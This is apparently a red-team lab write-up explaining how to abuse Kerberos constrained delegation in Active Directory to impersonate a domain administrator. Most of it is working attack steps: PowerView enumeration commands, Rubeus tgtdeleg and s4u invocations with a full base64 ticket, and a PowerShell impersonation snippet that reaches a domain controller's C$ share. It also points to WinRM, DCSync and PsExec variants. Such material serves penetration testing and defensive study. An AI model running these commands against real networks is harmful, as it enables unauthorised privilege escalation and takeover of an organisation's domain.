# Kerberos Constrained Delegation

If you have compromised a user account or a computer \(machine account\) that has kerberos constrained delegation enabled, it's possible to impersonate any domain user \(including administrator\) and authenticate to a service that the user account is trusted to delegate to.

## User Account

### Prerequisites

Hunting for user accounts that have kerberos constrained delegation enabled:

{% code title="attacker@target" %}
```text
Get-NetUser -TrustedToAuth
```
{% endcode %}

In the below screenshot, the user `spot` is allowed to delegate or in other words, impersonate any user and authenticate to a file system service \(CIFS\) on a domain controller DC01. 

{% hint style="info" %}
User has to have an attribute `TRUSTED_TO_AUTH_FOR_DELEGATION` in order for it to be able to authenticate to the remote service.

> TRUSTED\_TO\_AUTH\_FOR\_DELEGATION - \(Windows 2000/Windows Server 2003\) The account is enabled for delegation. This is a security-sensitive setting. Accounts that have this option enabled should be tightly controlled. This setting lets a service that runs under the account assume a client's identity and authenticate as that user to other remote servers on the network. 
>
> [https://support.microsoft.com/en-gb/help/305144/how-to-use-useraccountcontrol-to-manipulate-user-account-properties](https://support.microsoft.com/en-gb/help/305144/how-to-use-useraccountcontrol-to-manipulate-user-account-properties)
{% endhint %}

Attribute `msds-allowedtodelegateto` identifies the SPNs of services the user `spot` is trusted to delegate to \(impersonate other domain users\) and authenticate to - in this case, it's saying that the user spot is allowed to authenticate to CIFS service on DC01 on behalf of any other domain user:

![](../../.gitbook/assets/image%20%28199%29.png)

The `msds-allowedtodelegate` attribute in AD is defined here:

![](../../.gitbook/assets/image%20%28278%29.png)

The `TRUSTED_TO_AUTH_FOR_DELEGATION` attribute in AD is defined here:

![](../../.gitbook/assets/image%20%28335%29.png)

### Execution

Assume we've compromised the user `spot` who has the constrained delegation set as described earlier. Let's check that currently we cannot access the file system of the DC01 before we impersonate a domain admin user:

{% code title="attacker@target" %}
```text
dir \\dc01\c$
```
{% endcode %}

![](../../.gitbook/assets/image%20%28191%29.png)

Let's now request a delegation TGT for the user spot:

{% code title="attacker@target" %}
```text
\\vboxsvr\tools\Rubeus\Rubeus.exe tgtdeleg
```
{% endcode %}

![](../../.gitbook/assets/image%20%28349%29.png)

Using rubeus, we can now request TGS for `administrator@offense.local`, who will be allowed to authenticate to `CIFS/dc01.offense.local`:

{% code title="attacker@target" %}
```text
# ticket is the base64 ticket we get with `rubeus's tgtdeleg`
Rubeus.exe s4u /ticket:doIFCDCCBQSgAwIBBaEDAgEWooIEDjCCBAphggQGMIIEAqADAgEFoQ8bDU9GRkVOU0UuTE9DQUyiIjAgoAMCAQKhGTAXGwZrcmJ0Z3QbDU9GRkVOU0UuTE9DQUyjggPEMIIDwKADAgESoQMCAQKiggOyBIIDro3ZCHDaVettnJseuyFJMK+Il4GAtWVAHPAq02cnHmOs3R2KcrOWpf3YbtnTD7fB+rKdZ8aElgloJO+v4XVM2NgyOVIia0MzNToDrK1ynhC70aApbag+ykvUFTDeG9NjhE3TVk3+F99vWboy6hhc9AmRUJwHFuqLC4djtL2PtQSpgWWL42W5eONlIZkc5XK0kWkC/AvivuuPOHs9aEy3g38hoBeApZE8NqT7mGKz5JHLwV5TyUgo87s6fFVSn8LHK8CI6G0x2DRhxxu04q0qnRXhLJ5S0MyJgJj6YDVESvCUgep5MXR+OYp0EGdVP8qQJK+x6m4rmr0Y3nd1Klmc+xDnLSC11ay7I8VevqhCBCZ64c+HQow4qcMTa/agxyOXqK42ynUl0GJtrLV7nIIrp+J2e5PECDUXIjKFkGnp6HZDNfzYAGL3XxyyT2JYdneOS3VUzJQyEctjuQMdVA0wB8NrRqDVdqSNBSOyBwpB3/FWzdHNYxztRmVT+Yz6qJCU4SYHIzHUE5dqHjvhjPSwgAkhS/QNApxtWvyba8iwCSnyualuhK46LS0pkt1IIQT0Y+qw80oL6mzjD+rxfKgR4B9hI6Imw9zTT5rjlRNMjWEy78izLtRB+ulzqdkZCUMA6zswWjq1BTmWzZX0LAZ+QAWQJPzoRVsqOcZCZwo/aWwmO1s9v5TLRRMLTAvk16PQW3z9NHix2Io9sObH8cb7gVrB+u2Q545Qwekl0uwP5mCar6swU2oEkxBm5DZvLsbZTcGl+KzGxqq/zhEJm3EceLuwIY81z8aYu13c6AsYETs9VevdEVysylpNL7EcHu8iXsoE5JmLx7OrcPR9WfeFWxRDp+1CVDijOI5VOS51+JpkEvcXFmfZueqLTJ66VGJgQaP7A3B//Y40ur5nSXyvEmIKgzdeqPLpGa5GPiNs/rYFmMlxwEX+yVFB5bPYgoszr3Crjsvs6Q/vdr36NoWqI9/11Nurzeeknt+k8sUV26URnQVkecW4yJFQ2TZwYCJ1k9h4cr96csJ9HhJO46UBye/8oqlqJXKnYY3JpaZiXWK77kG7BqhM6oPl+oEIbX2ycj/gHesxREvP7/vYINk33KbOSxXTAi3Je3wbZP7N+3B9Lz04m8Xi6nGeIVsZiMyODpnJVX5Bgq+3cGaSty0v+fIfqMHDwuKhOS7h1MGLJduhWh3b21ytDfzn73yyCPskFee2ckAomlAgxMzg8ZatmZDLTxfUenJ+EnrJgkYee6OB5TCB4qADAgEAooHaBIHXfYHUMIHRoIHOMIHLMIHIoCswKaADAgESoSIEIN2JDvcjQZeMR+7giMsawE1vG/Cmw9IFIV7ZYwaELMqaoQ8bDU9GRkVOU0UuTE9DQUyiETAPoAMCAQGhCDAGGwRzcG90owcDBQBgoQAApREYDzIwMTkwODE3MTMyMDU2WqYRGA8yMDE5MDgxNzIzMDY0MFqnERgPMjAxOTA4MjQxMzA2NDBaqA8bDU9GRkVOU0UuTE9DQUypIjAgoAMCAQKhGTAXGwZrcmJ0Z3QbDU9GRkVOU0UuTE9DQUw= /impersonateuser:administrator /domain:offense.local /msdsspn:cifs/dc01.offense.local /dc:dc01.offense.local /ptt
```
{% endcode %}

![](../../.gitbook/assets/image%20%2844%29.png)

We've got the impersonated TGS tickets for administrator account:

![](../../.gitbook/assets/image%20%28290%29.png)

Which as we can see are now in memory of the current logon session:

{% code title="attacker@target" %}
```text
klist
```
{% endcode %}

![](../../.gitbook/assets/image%20%28460%29.png)

If we now attempt accessing the file system of the DC01 from the user's spot terminal, we can confirm we've successfully impersonated the domain administrator account that can authenticate to the CIFS service on the domain controller DC01:

{% code title="attacker@target" %}
```text
dir \\dc01.offense.local\c$
```
{% endcode %}

![](../../.gitbook/assets/image%20%28386%29.png)

Note that in this case we requested a TGS for the CIFS service, but we could also request additional TGS tickets with rubeus's ~~`/altservice`~~ switch for: HTTP \(WinRM\), LDAP \(DCSync\), HOST \(PsExec shell\), MSSQLSvc \(DB admin rights\).

## Computer Account

If you have compromised a machine account or in other words you have a SYSTEM level privileges on a machine that is configured with constrained delegation, you can assume any identity in the AD domain and authenticate to services that the compromised machine is trusted to delegate to. 

In this lab, a workstation WS02 is trusted to delegate to DC01 for CIFS and LDAP services and I am going to exploit the CIFS services this time:

![](../../.gitbook/assets/image%20%28215%29.png)

Using powerview, we can find target computers like so:

{% code title="attacker@target" %}
```csharp
Get-NetComputer ws02 | select name, msds-allowedtodelegateto, useraccountcontrol | fl
Get-NetComputer ws02 | Select-Object -ExpandProperty msds-allowedtodelegateto | fl
```
{% endcode %}

![](../../.gitbook/assets/image%20%28394%29.png)

Let's check that we're currently running as SYSTEM and can't access the C$ on our domain controller DC01:

{% code title="attacker@target" %}
```csharp
hostname
[System.Security.Principal.WindowsIdentity]::GetCurrent() | select name
ls \\dc01.offense.local\c$
```
{% endcode %}

![](../../.gitbook/assets/image%20%2856%29.png)

Let's now impersonate administrator@offense.local and try again:

{% code title="attacker@target" %}
```csharp
[Reflection.Assembly]::LoadWithPartialName('System.IdentityModel') | out-null
$idToImpersonate = New-Object System.Security.Principal.WindowsIdentity @('administrator')
$idToImpersonate.Impersonate()
[System.Security.Principal.WindowsIdentity]::GetCurrent() | select name

ls \\dc01.offense.local\c$
```
{% endcode %}

![](../../.gitbook/assets/image%20%28184%29.png)

## References

{% embed url="https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/" %}

{% embed url="https://www.harmj0y.net/blog/activedirectory/the-most-dangerous-user-right-you-probably-have-never-heard-of/" %}

{% embed url="https://blogs.msdn.microsoft.com/mattlind/2010/01/13/delegation-tab-in-aduc-not-available-until-a-spn-is-set/" %}

{% embed url="https://blogs.technet.microsoft.com/tristank/2007/06/18/kdc\_err\_badoption-when-attempting-constrained-delegation/" %}

{% embed url="https://support.microsoft.com/en-gb/help/305144/how-to-use-useraccountcontrol-to-manipulate-user-account-properties" %}

